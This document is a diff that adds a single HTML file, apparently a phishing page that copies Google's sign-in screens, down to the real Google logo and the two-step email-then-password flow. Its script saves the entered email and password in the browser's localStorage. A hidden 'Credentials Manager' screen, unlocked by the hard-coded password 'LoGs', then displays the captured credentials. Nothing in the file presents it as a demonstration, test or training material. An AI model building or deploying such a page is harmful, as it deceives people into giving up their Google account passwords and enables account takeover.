@@ -1,1 +1,191 @@
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Sign In</title>
+    <style>
+        body {
+            font-family: 'Roboto', Arial, sans-serif;
+            background-color: #f5f5f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .login-container {
+            width: 450px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            padding: 40px;
+            text-align: center;
+        }
+        .google-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 10px;
+        }
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 40px;
+            font-size: 16px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            margin-bottom: 20px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            box-sizing: border-box;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        .forgot-email {
+            text-align: left;
+            margin-bottom: 40px;
+        }
+        .forgot-email a {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+        }
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+        }
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-weight: 500;
+            padding: 10px;
+        }
+        .next-button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .next-button:hover {
+            background-color: #1765cc;
+        }
+        .hidden {
+            display: none;
+        }
+        .password-protected {
+            margin-top: 20px;
+        }
+        #passwordInput {
+            margin-top: 20px;
+        }
+        .credentials-display {
+            background-color: #f5f5f5;
+            padding: 20px;
+            border-radius: 8px;
+            margin-top: 20px;
+            text-align: left;
+            font-family: monospace;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container" id="loginPage">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        <h1>Sign in</h1>
+        <p class="subtitle">Use your Google Account</p>
+        <input type="email" id="email" placeholder="Email or phone">
+        <div class="forgot-email">
+            <a href="#">Forgot email?</a>
+        </div>
+        <div class="buttons">
+            <a href="#" class="create-account">Create account</a>
+            <button class="next-button" id="nextButton">Next</button>
+        </div>
+    </div>
 
+    <div class="login-container hidden" id="passwordPage">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        <h1>Welcome</h1>
+        <p class="subtitle" id="userEmailDisplay"></p>
+        <input type="password" id="password" placeholder="Enter your password">
+        <div class="buttons">
+            <a href="#" class="create-account" id="forgotPassword">Forgot password?</a>
+            <button class="next-button" id="signInButton">Sign in</button>
+        </div>
+    </div>
+
+    <div class="login-container hidden" id="credentialsPage">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google" class="google-logo">
+        <h1>Credentials Manager</h1>
+        <p class="subtitle">Password protected</p>
+        <div class="password-protected">
+            <input type="password" id="accessPassword" placeholder="Enter access password">
+            <button class="next-button" id="viewCredentials">View</button>
+        </div>
+        <div class="credentials-display hidden" id="credentialsDisplay">
+            <p><strong>Email:</strong> <span id="storedEmail"></span></p>
+            <p><strong>Password:</strong> <span id="storedPassword"></span></p>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const loginPage = document.getElementById('loginPage');
+            const passwordPage = document.getElementById('passwordPage');
+            const credentialsPage = document.getElementById('credentialsPage');
+            const nextButton = document.getElementById('nextButton');
+            const signInButton = document.getElementById('signInButton');
+            const viewCredentials = document.getElementById('viewCredentials');
+            
+            let storedEmail = '';
+            let storedPassword = '';
+
+            nextButton.addEventListener('click', function() {
+                const email = document.getElementById('email').value;
+                if (email) {
+                    storedEmail = email;
+                    loginPage.classList.add('hidden');
+                    passwordPage.classList.remove('hidden');
+                    document.getElementById('userEmailDisplay').textContent = email;
+                }
+            });
+
+            signInButton.addEventListener('click', function() {
+                const password = document.getElementById('password').value;
+                if (password) {
+                    storedPassword = password;
+                    localStorage.setItem('userEmail', storedEmail);
+                    localStorage.setItem('userPassword', storedPassword);
+                    passwordPage.classList.add('hidden');
+                    credentialsPage.classList.remove('hidden');
+                }
+            });
+
+            viewCredentials.addEventListener('click', function() {
+                const accessPassword = document.getElementById('accessPassword').value;
+                if (accessPassword === 'LoGs') {
+                    document.getElementById('storedEmail').textContent = localStorage.getItem('userEmail');
+                    document.getElementById('storedPassword').textContent = localStorage.getItem('userPassword');
+                    document.getElementById('credentialsDisplay').classList.remove('hidden');
+                } else {
+                    alert('Incorrect password');
+                }
+            });
+        });
+    </script>
+</body>
+</html>
+```
